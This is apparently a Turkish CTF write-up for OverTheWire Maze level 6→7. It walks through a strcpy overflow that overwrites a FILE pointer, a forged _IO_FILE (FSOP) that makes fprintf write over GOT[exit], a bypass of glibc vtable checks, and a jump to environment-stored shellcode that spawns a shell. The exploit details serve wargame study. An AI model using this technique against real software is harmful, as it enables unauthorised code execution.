# OverTheWire — Maze Level 6 → 7

> Hedef: `maze6`'dan `maze7` şifresi. Sonuç: **`**********`** (gizlendi)
> Teknik: `strcpy` stack overflow ile **`FILE*` üzerine yazma (FSOP)** → sahte `FILE` ile `fprintf`'i **`GOT[exit]`'e arbitrary write** yaptırma → hemen sonraki `exit()` shellcode'a atlar (NX kapalı).

---

## 1. İlk Bakış
```bash
/maze/maze6 file2write2 string     # usage
checksec: No canary | NX DISABLED | No PIE | No RELRO
```

## 2. Analiz (sözde-kod)
```c
char buf[256];                  // [ebp-0x104]
FILE *fp;                       // [ebp-0x4]   (buf'tan HEMEN sonra)
if (argc != 3) { printf("%s file2write2 string\n", argv[0]); exit(-1); }
fp = fopen(argv[1], "a");
strcpy(buf, argv[2]);           // <-- OVERFLOW (sınır yok); buf+256 = fp
memfrob(buf, strlen(buf));      // her baytı 42 (0x2a) ile XOR
fprintf(fp, "%s : %s\n", argv[1], buf);
exit(0);                        // <-- main RET ETMEZ
```

## 3. Zafiyetin İnceliği
- `strcpy` ile **256 baytlık `buf` taşar**; hemen üstündeki `fp` (FILE*) ezilebilir.
- Ama main `exit()` ile biter → **dönüş adresini ezmek işe yaramaz** (ret hiç çalışmaz).
- Overflow'un tek anlamlı hedefi: **`fp`**. `fprintf(fp,...)` bizim sahte FILE'ımızı kullanır.
- **No RELRO** → `GOT` yazılabilir. `fprintf`'in çıktısını **`GOT[exit]`'e** yönlendirirsek, oraya bir adres yazdırıp hemen sonraki `exit()`'i kaçırırız. **NX kapalı** → adresi env'deki shellcode'a verir, exit shellcode'a atlar.

## 4. Sahte FILE (FSOP) Kurgusu
`fprintf → vfprintf → _IO_file_xsputn` yolu, FILE'ın **`_IO_write_ptr`'ından** itibaren tampona `memcpy` yapar. Yani `_IO_write_ptr = GOT[exit]` yaparsak çıktı GOT'a yazılır.

Sahte 32-bit `_IO_FILE` için kritik alanlar:
| Offset | Alan | Değer | Neden |
|--------|------|-------|-------|
| 0x00 | `_flags` | `0xFBAD8001` | magic + USER_LOCK (kilit atla), NO_WRITES/LINE_BUF yok |
| 0x14 | `_IO_write_ptr` | `GOT[exit]-10` | `"argv1 : "` (10 bayt) sonrası `buf` tam GOT[exit]'e düşer |
| 0x18 | `_IO_write_end` | büyük | bol yer → `_IO_OVERFLOW` çağrılmaz, sadece memcpy |
| 0x46 | `_vtable_offset` | `8` | vtable'ı `0x94+8`'ten okut (0x46'daki **null'dan kaç**) |
| 0x68 | `_mode` | `-1` | `_IO_fwide` negatif dönsün (wide moda kaymasın) |
| 0x9c | vtable ptr | **gerçek** `_IO_file_jumps` (`0xf7faa7a8`) | glibc **vtable doğrulaması** var → sahte vtable abort eder; gerçeğini kullan |

> glibc 2.39 `_IO_vtable_check` sahte vtable'ı reddeder. Çözüm: vtable'ı **gerçek** `_IO_file_jumps`'a göster (yazma için `__xsputn = _IO_file_xsputn` zaten istediğimiz memcpy'yi yapar). Sahte FILE'ı env'e koyduk; içinde null olmaması için `_vtable_offset` hilesini kullandık.

## 5. İki Pürüz Daha
- **`memfrob`**: `buf`'u XOR 42 yapar. `fp` overwrite ve yazılacak baytlar `buf` içinde → **önceden frob'la** (`argv2 = image XOR 0x2a`). `memfrob` sonrası `buf = image`.
- **Adresler**: ASLR kapalı. env'deki shellcode (`SC`) ve sahte FILE (`FF`) adreslerini, argv/env/execfn uzunlukları eşleştirilmiş 32-bit printer ile öğrendim. `GOT[exit]=0x804b208`, vtable `0xf7faa7a8` gdb ile bulundu.

## 6. Exploit Akışı
```
argv1 = "/tmp/m6"  (7 char; fopen "a")
argv2 = frob( [GOT'a yazılacak: SC_target][0x00 terminator][...][buf+256 = &FF] )
env   = { SC: NOPsled+shellcode , FF: sahte FILE }
fp (ezilen) -> &FF
fprintf -> "/tmp/m6 : " + 4 bayt(SC_target) yazar @ GOT[exit]
exit()  -> jmp *GOT[exit] -> shellcode (maze7) -> execve("/bin/sh")
```
```
SC=0xffffdd1c FF=0xffffdf4b sc_target=0xffffde1c
uid=15007(maze7) ... <maze7 şifresi>
```

## Dersler
| Konu | Not |
|------|-----|
| `exit()` vs `ret` | main ret etmiyorsa dönüş-adresi overflow'u boşa; başka primitive (FILE*) gerekir |
| FSOP | Kontrol edilen `FILE*` + `fprintf` = arbitrary write; `_IO_write_ptr` hedefe çevrilir |
| glibc vtable check | Sahte vtable yasak → **gerçek** `_IO_file_jumps`'ı kullan, sadece alanları oyna |
| No RELRO | `GOT` yazılabilir → `exit` GOT'u ezilip kontrol alınır |
| `memfrob` | XOR 42; payload'ı önceden frob'la |
| `_vtable_offset` | Null gerektiren `0x46` alanını sıfırlamak yerine offset'i kaydır |
